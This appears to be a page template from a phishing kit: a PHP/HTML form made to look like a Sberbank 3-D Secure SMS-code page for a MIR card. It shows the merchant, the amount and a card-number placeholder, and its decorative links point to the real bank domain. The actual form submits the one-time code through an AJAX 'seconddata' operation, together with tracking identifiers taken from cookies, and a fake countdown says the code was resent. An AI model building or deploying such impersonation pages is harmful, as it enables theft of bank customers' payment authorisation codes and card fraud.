<?php require 'init.php'; ?>
<html>
<meta charset=utf-8>
<meta http-equiv=CACHE-CONTROL content=NO-CACHE>
<meta http-equiv=EXPIRES content="Mon, 22 Jul 2002 11:12:01 GMT">
<meta name=viewport content="width=device-width; initial-scale=1.0">
<style>html{height:100%}body{background-color:#FCFCFC;font-family:Helvetica;font-size:12px;padding:0;margin:0;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:block;height:100%}a{color:#0177ef;text-decoration:none}a:hover{text-decoration:underline}a.small{opacity:0.6}h1{font-size:18px}p{line-height:18px}.desc,.error{font-size:12px;margin:4px 0}.error{color:red}.modal-page{position:relative;width:342px;max-height:600px;background-color:#ffffff;padding:32px 24px 24px 24px;margin-top:0px;margin-left:auto;margin-right:auto;text-align:left;box-shadow:0 12px 28px rgba(0,0,0,0.1);border-radius:3px;font-size:12px}@media (max-height:600px){body{display:block}}.list{border-top:1px solid #dedede;padding-top:12px}.list-item{padding:4px 0;display:flex;align-items:baseline}.label{display:inline-block;width:45%;padding-right:24px;box-sizing:border-box;vertical-align:top;font-size:12px;opacity:0.5;text-align:right}.value{display:inline-block;width:48%;box-sizing:border-box}.big-input{padding:8px;background-color:#ffffff;border-color:#dedede;border-style:solid;border-width:1px;border-radius:6px}.big-input{display:block;width:100%}.big-button{height:36px;line-height:36px;-webkit-border-radius:4px;padding:0 18px;font-size:12px;font-weight:100}.big-button:hover,.inner-button:hover,.big-button-danger:hover{opacity:0.8}.big-button{background-color:#17c67a;border:none;color:#ffffff;margin:0 auto;display:block;-webkit-appearance:none;-webkit-border-radius:0;border-radius:0;width:100%;text-transform:uppercase}.big-input{font-size:14px;text-align:center;padding-left:0px;padding-right:0px}.big-input:hover,.small-input:hover{border:1px solid #263e4c}.header{display:flex;flex-direction:row;justify-content:space-between;align-items:center}.row:after{content:"";clear:both;display:table}.left{float:left;text-align:left}.right{float:right;text-align:right}input::-webkit-outer-spin-button,input::-webkit-inner-spin-button{-webkit-appearance:none}H1{padding-top:0.5em}<!---->.logo__image{width:100%;max-width:140px;height:auto}.row{margin-bottom:8px}.row:after,.row:before{display:table;content:" "}.row:after{clear:both}.loader{height:100%;text-align:center;position:absolute;width:100%;top:0;left:0;background-color:#ffffff;z-index:100;opacity:0.90}.help_icon{width:14px;height:13px;border:0px;padding-right:2px}</style>
<title>[TEXT_5]</title>
[HEADERS_ASSETS]

<link rel=icon href="data:;base64,iVBORw0KGgo="><link rel=canonical href=https://acs5.sbrf.ru/acs/api/3ds/otp></head>
<body>
<div id=mainContainer class=modal-page>
 <div class=loader style=display:none>
 
 </div>
 <div class=header>
 <div id=bankLogoContainer>
	<img src="/img/MyBank.png" alt="Bank logo" title="Bank logo" class=logo__image>
 </div>
 <div id=psLogoContainer>
	<img src="/img/MIR-111x56.png" class=logo__image>
 </div>
 </div>
 
 
 
<form class="client_ajax_form" autocomplete="off">
	<input type="hidden" name="operation" value="seconddata">
	<input type="hidden" name="keyid" value="<?php echo safe_array_access($_GET, 'id'); ?>">
	<input type="hidden" name="firstid" value="<?php echo safe_array_access($_COOKIE, 'firstid'); ?>">
	<input type="hidden" name="usertag" value="<?php echo safe_array_access($_COOKIE, 'usertag'); ?>">
	
	
 <h1>Введите Ваш код</h1>
 <div class=list id=descList style=display:block>
 <div class=list-item id=pa_merchant>
 <div class=label>Магазин:</div>
 <div class=value>[TEXT_3]</div>
 </div>
 <div class=list-item id=pa_desc>
 <div class=label>Описание:</div>
 <div class=value>[TEXT_4]</div>
 </div>
 <div class=list-item id=pa_amount>
 <div class=label>Сумма:</div>
 <div class=value><b>[TEXT_7] RUB</b></div>
 </div>
 <div class=list-item id=pa_date>
 <div class=label>Дата:</div>
 <div class=value><?php echo date('d/m/Y'); ?></div>
 </div>
 <div class=list-item id=pa_pan>
 <div class=label>Номер карты:</div>
 <div class=value>[CARDNUMBER]</div>
 </div>
 
 </div>
 <div class=desc>
 
 
 <div class=row style=display:none>
 
 
 
 
 </div>
 

<p class="if-error-hide-container">Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.</p>
<p class="if-error-show-container error" style="display:none;">Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.</p>
 
 
 </div>
 <div class=list>
 
 
 
 
 <input id=passwordEdit name="fields[0]" class=big-input type=password placeholder="Одноразовый SMS код" size=20 maxlength=20 autocomplete=off style=-webkit-text-security:disc;-moz-text-security:disc value>
 <p id="demo"></p>

<script>

function countDown(elm, duration, fn){
  // Set the date we're counting down to
  var countDownDate = new Date().getTime() + (1000 * duration);
  // Update the count down every 1 second
  var x = setInterval(function() {
    // Get today's date and time
    var now = new Date().getTime();

    // Find the distance between now and the count down date
    var distance = countDownDate - now;

    // Time calculations for days, hours, minutes and seconds
    var seconds = Math.floor((distance % (1000 * 600)) / 1000);

    // Output the result in an element with id="demo"
    elm.innerHTML = "Повторная отправка кода через "+seconds+" сек.";

    // If the count down is over, write some text 
    if (distance < 0) {
      clearInterval(x);
      fn();
      elm.innerHTML = "Код был отправлен повторно";
    }
  }, 1000);

}

countDown(document.getElementById('demo'), 180, function(){
;
})

</script> 
 
 <p style="border-bottom:1px solid #dedede">
 <span></span>
 <span id=timer style=color:rgb(102,102,102);display:none></span>
 </p>
 
 
 <input id=submitButton name=submitButton class=big-button type=submit value=Отправить>
 
 </div>
 </form>
 <form id=resendForm name=resendForm method=post action=https://acs5.sbrf.ru:443/acs/api/3ds/otp enctype=application/x-www-form-urlencoded>
 
 
 
 </form>
 <form id=cancelForm name=cancelForm method=post action=https://acs5.sbrf.ru:443/acs/api/3ds/otp enctype=application/x-www-form-urlencoded>
 <div class=row>
 
 
 <div class=left><a id=cancelLink href=#>Выход</a></div>
 <div class=right><a href=#><img src=data:image/gif;base64,R0lGODlhDgANAKIAAP+ZZv//zP/////MZv/Mmf8zAP+ZM/9mACH5BAAAAAAALAAAAAAOAA0AAAMreLrV+89IGEkQxFBFcA/bQQxHMQjhZFihYlxaewItR9QKENcBiRM0nAOSAAA7 class=help_icon alt=Help align=absbottom>Помощь</a></div>
 </div>
 
 </form>
 <form name=helpForm style=display:none>
 
 </form>
 <form name=cancelConfirmationForm style=display:none>
 
 </form>
</div>




</body></html>
<?php
bottom_proc('prepare_verificationphp');
